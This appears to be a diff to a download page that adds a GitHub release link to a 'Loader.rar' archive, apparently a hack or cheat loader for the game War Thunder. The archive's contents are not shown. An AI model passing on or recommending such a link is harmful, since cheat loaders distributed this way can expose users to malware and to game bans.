@@ -10,7 +10,7 @@
   <tr>
     <td>War-thunder</td>
     <td>01/13/2024</td>
-    <td><a href=''>Download</td>
+    <td><a href='https://github.com/anorfire/Mingle/releases/download/war-thunder-hck/Loader.rar'>Download</td>
   </tr>
 </table>
 <hr>  
